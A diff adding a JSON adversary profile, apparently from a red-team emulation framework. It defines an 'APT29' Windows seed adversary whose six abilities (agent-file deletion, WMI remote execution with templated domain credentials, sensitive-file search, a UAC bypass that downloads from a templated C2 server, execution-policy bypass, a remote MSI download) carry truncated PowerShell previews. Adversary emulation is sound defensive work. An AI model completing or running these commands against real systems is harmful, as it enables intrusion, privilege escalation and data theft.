@@ -1,0 +1,66 @@
+{
+  "saved": true,
+  "adversary": {
+    "adversary_id": "temp-seed-fgdafj-1775116414",
+    "name": "Temp Seed Windows - APT29 Auto Profile Windows",
+    "description": "Auto-generated seed adversary from a8b7ce23-421b-44da-9e1d-489c6e2e9234 for agent fgdafj",
+    "atomic_ordering": [
+      "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "ece5dde3-d370-4c20-b213-a1f424aa8d03",
+      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
+      "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+      "60f63260-39bb-4136-87a0-b6c2dca799fc"
+    ]
+  },
+  "selected_abilities": [
+    {
+      "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "name": "Deadman - Delete agent file",
+      "tactic": "defense-evasion",
+      "technique_id": "T1070.004",
+      "noisy_score": 3,
+      "command_preview": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup; $startupInfo = New-CimInstance -CimCl…"
+    },
+    {
+      "ability_id": "ece5dde3-d370-4c20-b213-a1f424aa8d03",
+      "name": "Start 54ndc47 (WMI)",
+      "tactic": "execution",
+      "technique_id": "T1047",
+      "noisy_score": 2,
+      "command_preview": "$node = '''#{remote.host.fqdn}'''; $user = '''#{domain.user.name}'''; $password = '''#{domain.user.…"
+    },
+    {
+      "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "name": "Find files",
+      "tactic": "collection",
+      "technique_id": "T1005",
+      "noisy_score": 1,
+      "command_preview": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContin…"
+    },
+    {
+      "ability_id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
+      "name": "Bypass UAC Medium",
+      "tactic": "privilege-escalation",
+      "technique_id": "T1548.002",
+      "noisy_score": 0,
+      "command_preview": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"wi…"
+    },
+    {
+      "ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+      "name": "Emulate Administrator Tasks",
+      "tactic": "execution",
+      "technique_id": "T1059.001",
+      "noisy_score": 0,
+      "command_preview": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrat…"
+    },
+    {
+      "ability_id": "60f63260-39bb-4136-87a0-b6c2dca799fc",
+      "name": "Install PowerShell Core 6",
+      "tactic": "command-and-control",
+      "technique_id": "T1105",
+      "noisy_score": 0,
+      "command_preview": "$wc=New-Object System.Net.WebClient; $output=\"PowerShellCore.msi\"; $wc.DownloadFile(\"https://github…"
+    }
+  ]
+}
